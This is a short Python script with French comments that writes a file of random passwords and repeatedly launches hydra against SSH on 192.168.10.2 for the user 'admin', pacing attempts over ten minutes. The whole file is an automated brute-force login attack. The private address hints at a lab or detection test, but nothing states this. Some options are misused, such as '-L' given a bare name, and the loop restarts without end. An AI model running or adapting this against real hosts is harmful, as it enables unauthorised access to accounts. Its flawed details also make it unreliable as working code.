import os
import random
import string
import time
import socket
from subprocess import call

# Création des 1000 mots de passe qui seront testés par l'attaque
NUM_PASSWORDS = 999
PASSWORD_LENGTH = 8

with open('passwords.txt', 'w') as f:
    for i in range(NUM_PASSWORDS):
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=PASSWORD_LENGTH))
        f.write(password + '\n')

TARGET_IP = '192.168.10.2'
USER_LIST = ['admin']
with open('passwords.txt', 'r') as f:
    PASS_LIST = [line.strip() for line in f.readlines()]
TOTAL_ATTEMPTS = 1000
DURATION_MINUTES = 10
DELAY = (DURATION_MINUTES * 60) // TOTAL_ATTEMPTS
SSH_CHECK_INTERVAL = 10

def check_ssh():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(SSH_CHECK_INTERVAL)
    try:
        s.connect((TARGET_IP, 22))
        s.shutdown(socket.SHUT_RDWR)
        return True
    except:
        return False
    finally:
        s.close()

while True:
    if check_ssh():
        call(['hydra', '-L', ','.join(USER_LIST), '-P', 'passwords.txt', '-t', '1', '-f', '-v', '-e', 'nsr', '-s', '22', '-u', '-w', str(DELAY), 'ssh://' + TARGET_IP])
    else:
        print(f'Le service SSH est actuellement indisponible. Tentative de reconnexion dans {SSH_CHECK_INTERVAL} secondes.')
        time.sleep(SSH_CHECK_INTERVAL)
